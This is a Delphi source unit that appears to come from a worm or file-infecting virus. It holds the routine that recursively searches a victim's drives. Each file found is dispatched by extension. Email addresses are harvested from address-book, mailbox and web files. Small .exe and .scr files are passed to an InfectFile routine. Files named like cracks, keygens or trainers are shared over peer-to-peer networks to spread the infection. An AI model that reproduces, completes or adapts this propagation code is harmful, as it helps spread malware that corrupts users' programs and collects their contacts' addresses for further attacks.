   unit untSearch;

   interface

   uses
     windows,
     untP2P,
     untInfector,
     GetMail;

   const
     faReadOnly  = $00000001;
     faHidden    = $00000002;
     faSysFile   = $00000004;
     faVolumeID  = $00000008;
     faDirectory = $00000010;
     faArchive   = $00000020;
     faAnyFile   = $0000003F;

   Type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     Procedure FindFiles(Dir: String);

   implementation

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   function ExtractFileExt(const Filename: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     If Pos('.', Filename) = 0 Then
     Begin
       Result := '';
       Exit;
     End;
     L := Length(Filename);
     for i := L downto 1 do
     begin
       Ch := Filename[i];
       if (Ch = '.') then
       begin
         Result := Copy(Filename, i + 1, Length(Filename));
         Break;
       end;
     end;
   end;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function GetFileSize(FileName: String): Int64;
   Var
     H: THandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
     End;
   End;

   Procedure FindFiles(Dir: String);
   Var
     SR: TSearchRec;
   Begin
     Try
       If Dir[Length(Dir)] <> '\' Then Dir := Dir + '\';
       If FindFirst(Dir+'*.*', faDirectory, SR) = 0 Then
       Repeat
         If ((SR.Attr and faDirectory) = faDirectory) and (sr.Name[1] <> '.') Then
           FindFiles(Dir+SR.Name)
         Else Begin
           If SR.Name[1] <> '.' Then
           Begin
             If LowerCase(ExtractFileExt(Sr.Name)) = 'wab'  Then ReadWab(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'mbx'  Then GetEmailsFromMBX_TBB(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'tbb'  Then GetEmailsFromMBX_TBB(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'eml'  Then GetEmailsFromMBX_TBB(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'mai'  Then GetEmailsFromMBX_TBB(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'mbox' Then GetEmailsFromMBX_TBB(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'html' Then dogather(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'htm'  Then dogather(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'pl'   Then dogather(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'php'  Then dogather(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'asp'  Then dogather(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'txt'  Then dogather(Dir + SR.Name);
             If LowerCase(ExtractFileExt(Sr.Name)) = 'vbs'  Then dogather(Dir + SR.Name);

             If GetFileSize(SR.Name) < 500000 Then
             Begin
               If UpperCase(ExtractFileExt(Sr.Name)) = UpperCase('exe') Then InfectFile(Dir + Sr.Name);
               If UpperCase(ExtractFileExt(Sr.Name)) = UpperCase('scr') Then InfectFile(Dir + Sr.Name);
               If Pos('TRAINER', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('TRN', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('CRACK', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('CRK', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('KEYGEN', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('KGN', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
               If Pos('GEN', UpperCase(Sr.Name)) > 0 Then ShareP2P(Dir + SR.Name);
             End;
           End;
         End;
       Until FindNext(SR) <> 0;
       FindClose(SR);
     Except
       FindClose(SR);
       Exit;
     End;

   End;

   end.
